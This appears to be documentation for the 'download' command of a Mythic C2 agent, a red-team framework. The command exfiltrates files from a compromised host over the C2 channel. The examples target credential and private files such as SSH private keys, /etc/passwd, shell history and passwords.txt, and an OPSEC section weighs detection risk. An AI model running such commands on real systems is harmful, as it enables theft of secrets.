+++
title = "download"
chapter = false
weight = 10
+++

## Summary

Downloads a file from the target system to the Mythic server in configurable chunks.

The `download` command transfers files from the compromised system to the Mythic server using Base64 encoding and chunked transmission. File integrity is maintained through the chunking process, and transfer progress is displayed in real-time.

## Arguments

- **file_path** (string, required): Absolute path to the file on the target system to download

## Usage

```bash
download /etc/passwd
download /home/user/documents/sensitive.pdf
download /var/log/application.log
```

## Output

The command provides real-time progress updates during the transfer:

```
Starting download of /etc/passwd (2048 bytes in 1 chunks)
Downloading chunk 1/1 (2048 bytes)...
File downloaded successfully: /etc/passwd
```

For large files:
```
Starting download of /home/user/large_file.zip (52428800 bytes in 102 chunks)
Downloading chunk 1/102 (524288 bytes)...
Downloading chunk 2/102 (524288 bytes)...
...
File downloaded successfully: /home/user/large_file.zip
```

## Technical Details

- **Chunk Size**: Configurable via `chunk_size` build parameter (default: 512KB)
- **Encoding**: Files are Base64 encoded for transport
- **Error Handling**: Provides detailed error messages for permission issues, missing files, etc.
- **Performance**: Uses realtime mode if enabled to reduce transfer latency
- **File Size**: No practical size limit, handled through chunking

## OPSEC Considerations

- File reads are performed by the agent process, not spawned subprocesses
- Transfer uses normal C2 communication channels
- Large files create multiple HTTP requests which may be observable
- Consider file size vs. detection risk when downloading large files

## Examples

Download system configuration files:
```bash
download /etc/hosts
download /etc/resolv.conf
download /etc/ssh/sshd_config
```

Download user files:
```bash
download /home/user/.bash_history
download /home/user/.ssh/id_rsa
download /home/user/Documents/passwords.txt
```

## Error Handling

Common error scenarios:

- **File not found**: "Error: File does not exist: /path/to/file"
- **Permission denied**: "Error: Permission denied accessing /path/to/file"
- **Read error**: Detailed error message with system error code